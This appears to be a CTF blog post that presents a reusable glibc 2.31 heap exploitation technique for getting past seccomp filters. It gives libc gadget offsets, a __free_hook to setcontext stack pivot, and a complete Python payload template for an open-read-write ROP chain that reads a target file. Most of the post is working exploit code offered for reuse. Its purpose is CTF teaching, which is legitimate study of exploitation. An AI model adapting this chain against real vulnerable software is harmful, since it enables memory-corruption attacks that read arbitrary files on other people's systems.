# Glibc 2.31 Heap + Seccomp Exploitation Technique using ROP 
## Introduction
*In this post, I assume that readers are somewhat comfortable with heap exploitation. If you are not, you can start with other simpler techniques available on the Internet to get used to it first.*

Recently, I have seen a lot of glibc 2.31 heap pwning challenges in various CTFs that include `seccomp` filters which prevent you from directly overwrite `__free_hook` with `one_gadget` to pop a shell. I have also read some writeups of different CTF players using different techniques to workaround the `seccomp` filters, but it seems that no one has written about a generalized exploitation technique for this kind of challenge. Therefore in this blog post, I will demonstrate the technique I use, analyze how it works and provide you with a template that can be reused if the pre-requisites are met.

## Pre-requisites
For this technique to be successfully executed, the following conditions must be met:
- You can leak `libc` and `heap`'s base addresses. 
- You have a primitive that can overwrite `__free_hook`.
- My ROP chain is an `open-read-write` chain, which means that the only syscalls that need to be allowed by `seccomp` are `open`, `read` and `write` (this is true for most challenges). It doesn't need `mmap` or `mprotect` to work.
- You can write to a heap chunk that is large enough to contain the payload, which is 0x168 bytes, if it's too much, you can consider using other shorter payloads with `mprotect` or `mmap`, but the idea is the same (and of course you must be able to `free` that chunk).
- You know the absolute path to `flag` file (which you can most of the time ask the organizers).

## Gadgets
As I mentioned in the title, this technique is a ROP chain on the heap, and with ROP, the most important things are the gadgets. All the gadgets that are used in this technique are in `libc` itself, the `libc-2.31.so` version I used here has `md5sum` of `1ec728d58f7fc0d302119e9bb53050f8`. If you have a `libc-2.31.so` that has different checksum, the offset might be different, but the gadgets should still be there. Below are the gadgets I use:

Firstly, the ordinary gadgets that deal with manipulating registers and `syscall`:
```python
# l.address is leaked base of libc
pop_rdi = l.address + 0x26b72
pop_rsi = l.address + 0x27529
pop_rdx_r12 = l.address + 0x11c371
push_rax = l.address + 0x45197
pop_rax = l.address + 0x4a550
xchg_eax_edi = l.address + 0x2ad2b
syscall_ret = l.address + 0x66229
```

All the gadgets except `syscall_ret` can be found using this [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) tool. For `syscall_ret`, you can use this command (thanks `@Catafact` for this): 
```
objdump -D -Mintel ./libc-2.31.so | grep -B 1 ret | grep -A 1 syscall
``` 

The next 2 gadgets are crucial for this technique, the first one is at `call_gadget = l.address + 0x154930`:
```asm
mov     rdx, [rdi+8]
mov     [rsp], rax
call    qword ptr [rdx+0x20]
```

This gadget is what we will overwrite `__free_hook` with. It allows us to call an arbitrary function through `rdx`, if we control `rdi`, which is exactly the parameter that will be passed to `free()`. 

The next gadget is inside libc function `setcontext()`, at offset `setcontext_gadget = l.address + 0x580DD`:
```asm
mov     rsp, [rdx+0A0h]
mov     rbx, [rdx+80h]
mov     rbp, [rdx+78h]
mov     r12, [rdx+48h]
mov     r13, [rdx+50h]
mov     r14, [rdx+58h]
mov     r15, [rdx+60h]
test    dword ptr fs:48h, 2
jz      loc_581C6

loc_581C6:
mov     rcx, [rdx+0A8h]
push    rcx
mov     rsi, [rdx+70h]
mov     rdi, [rdx+68h]
mov     rcx, [rdx+98h]
mov     r8, [rdx+28h]
mov     r9, [rdx+30h]
mov     rdx, [rdx+88h]
xor     eax, eax
ret
```
Because we control `rdx`, this gadget allows us to set almost every registers (with the exception of `rax`, `r10` and `r11`).

## The payload
My payload can be divided into 3 parts, which I will explain one by one. 

The first part:
```python
base = heap + <.....>             # payload_base (address of the chunk)
payload = b"A"*8                  # <-- [rdi] <-- payload_base
payload += p64(base)              # <-- [rdi + 8] = rdx
payload += b"B"*0x10              # padding
payload += p64(setcontext_gadget) # <-- [rdx + 0x20]
```
This is the `base` of our payload, where `rdi` will be pointed to when `free()` is called. I set `[rdi + 8]` to also be `base`, so that when `mov rdx, [rdi+8]` is executed, `rdx` will also point at `base`. Then `[rdx + 0x20]` will be the address of the `setcontext()` gadget, which will be called.

The second part, which will be utilized after `setcontext_gadget` is called:
```python
payload += p64(0)                 # <-- [rdx + 0x28] = r8
payload += p64(0)                 # <-- [rdx + 0x30] = r9
payload += b"A"*0x10              # padding
payload += p64(0)                 # <-- [rdx + 0x48] = r12
payload += p64(0)                 # <-- [rdx + 0x50] = r13
payload += p64(0)                 # <-- [rdx + 0x58] = r14
payload += p64(0)                 # <-- [rdx + 0x60] = r15
payload += p64(base + 0x258)      # <-- [rdx + 0x68] = rdi (ptr to flag path)
payload += p64(0)                 # <-- [rdx + 0x70] = rsi (flag = O_RDONLY)
payload += p64(0)                 # <-- [rdx + 0x78] = rbp
payload += p64(0)                 # <-- [rdx + 0x80] = rbx
payload += p64(0)                 # <-- [rdx + 0x88] = rdx 
payload += b"A"*8                 # padding
payload += p64(0)                 # <-- [rdx + 0x98] = rcx 
payload += p64(base + 0x1b0)      # <-- [rdx + 0xa0] = rsp, perfectly setup for it to ret into our chain
payload += p64(pop_rax)           # <-- [rdx + 0xa8] = rcx, will be pushed to rsp
```
With the comments, it is self-explanatory. This is where all the registers are set based on `rdx`. Even though there are lots of registers to set, I'm only interested at `rdi` and `rsi`, which will be the parameters to `sys_open`, along with `rcx` and `rsp`, which must be carefully set so that after `push rcx` is executed, `rsp` must be in the correct position to execute the third part, which is the ROP chain on the heap, `rcx` is set to `pop_rax` gadget to start the chain.

The third part:
```python
payload += p64(2)
payload += p64(syscall_ret) # sys_open("/path/to/flag", O_RDONLY)
payload += p64(xchg_eax_edi)
payload += p64(pop_rsi)
payload += p64(heap + 0x15000) # destination buffer, can be anywhere readable and writable
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(0)
payload += p64(syscall_ret) # sys_read(eax, heap + 0x15000, 0x100)
payload += p64(pop_rdi)
payload += p64(1)
payload += p64(pop_rsi)
payload += p64(heap + 0x15000) # buffer
payload += p64(pop_rdx_r12)
payload += p64(0x100) + p64(0) # nbytes
payload += p64(pop_rax)
payload += p64(1)
payload += p64(syscall_ret) # sys_write(1, heap + 0x15000, 0x100)
payload += b"/path/to/flag"
```
Nothing much to say about this part, if you know ROP, you know that this is an ordinary `open-read-write` chain.

After allocating this `payload` and overwriting `__free_hook` with the `call_gadget`, calling `free()` on it will execute the chain and print out the `flag`.

## Examples
Here are some writeups to challenges that me and my team solved using this technique:
- [TetCTF2021 - cache_v1 & cache_v2](https://blog.efiens.com/post/tetctf2021-pwn-writeups/) by `@midas` (me).
- [ASCIS/SVATTT2020 Finals - Secret Keeper](https://blog.efiens.com/post/ascis2020-final-secret-keeper/) by `@pickaxe`

